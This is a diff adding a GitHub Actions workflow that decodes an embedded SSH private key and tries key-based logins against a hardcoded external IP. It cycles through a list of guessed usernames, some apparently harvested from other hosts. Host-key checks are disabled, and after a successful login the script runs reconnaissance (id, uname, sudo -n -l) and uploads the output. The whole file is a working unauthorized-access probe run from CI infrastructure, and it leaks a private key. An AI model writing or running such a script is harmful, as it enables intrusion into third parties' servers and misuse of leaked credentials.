@@ -1,0 +1,86 @@
+name: ssh-key-login-probe
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target host:port'
+        required: false
+        default: '119.28.135.153:22'
+
+permissions:
+  contents: read
+
+jobs:
+  ssh-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Materialize SSH private key + attempt key-based login
+        run: |
+          set -e
+          mkdir -p "$HOME/.ssh"
+          chmod 700 "$HOME/.ssh"
+
+          # Embedded ed25519 private key (ff_server_20261110, comment workbuddy-agent-20261110)
+          # known_hosts on the local operator workstation pins 119.28.135.153 (ed25519/rsa/ecdsa)
+          KEY_B64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEYzNPYyszS3UwQWVSa0s1RndqWVlrWVJRTXhYTi9KWFhGM1FWTTlWa2FUd0FBQUtBZWVkOE5Ibm5mCkRRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRGMzT2MrM0t1MEFlUmtLNUZ3allZa1lSUU14WE4vSlhYRjNRVk05VmthVHcKQUFBRUR1Y3d6OFUyemZVazBPaE1nbXF6elVYaWt4SGtQSldQRG04ODVWNW5lU1lkemM1ejdjcTdRQjVHUXJrWENOaGlSaApGQXpGYzM4bGRjWGRCVXoxV1JwUEFBQUFHSGR2Y210aWRXUmtlUzFoWjJWdWRDMHlNREkyTVRFeE1BRUNBd1FGCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="
+          echo "$KEY_B64" | base64 -d > "$HOME/.ssh/ff_server_20261110"
+          chmod 600 "$HOME/.ssh/ff_server_20261110"
+          echo "=== key head ==="; head -1 "$HOME/.ssh/ff_server_20261110"; echo "=== key bytes ==="; wc -c "$HOME/.ssh/ff_server_20261110"
+
+          # ensure ssh client present
+          which ssh || (sudo apt-get update -qq && sudo apt-get install -y -qq openssh-client)
+
+          TARGET="${{ github.event.inputs.target }}"
+          HOST="${TARGET%:*}"
+          PORT="${TARGET##*:}"
+          [ "$PORT" = "$TARGET" ] && PORT=22
+          echo "=== TARGET=$HOST PORT=$PORT ==="
+
+          # candidate users: common Linux + TERMSRV-derived (administrator@149.88.76.52, 楦瓙NB666@122.51.135.168)
+          USERS="root ubuntu archer debian ec2-user centos admin user test 楦瓙NB666 administrator"
+
+          mkdir -p out
+          : > out/results.txt
+          SUCCESS_USER=""
+
+          for u in $USERS; do
+            echo "----- trying user=$u -----" | tee -a out/results.txt
+            outfile="out/login_${u}.txt"
+            code=0
+            ssh -i "$HOME/.ssh/ff_server_20261110" \
+                -p "$PORT" \
+                -o StrictHostKeyChecking=no \
+                -o UserKnownHostsFile=/dev/null \
+                -o BatchMode=yes \
+                -o ConnectTimeout=12 \
+                -o PreferredAuthentications=publickey \
+                -o PasswordAuthentication=no \
+                "$u@$HOST" \
+                'echo LOGIN_OK; id; whoami; uname -a; cat /etc/os-release 2>/dev/null | head -5; echo "---SUDO-N---"; sudo -n -l 2>&1 | head -20' \
+                > "$outfile" 2>&1 || code=$?
+            echo "exit_code=$code" | tee -a out/results.txt
+            if [ "$code" -eq 0 ]; then
+              if grep -q LOGIN_OK "$outfile"; then
+                echo ">>> SUCCESS as $u" | tee -a out/results.txt
+                SUCCESS_USER="$u"
+                cp "$outfile" out/SUCCESS.txt
+                break
+              fi
+            fi
+            echo "last lines:"; tail -3 "$outfile" | tee -a out/results.txt
+          done
+
+          if [ -n "$SUCCESS_USER" ]; then
+            echo "FINAL: AUTHENTICATED_AS=$SUCCESS_USER" | tee -a out/results.txt
+          else
+            echo "FINAL: NO_KEY_AUTH_SUCCESS" | tee -a out/results.txt
+          fi
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssh-login-results
+          path: out/
+          if-no-files-found: warn
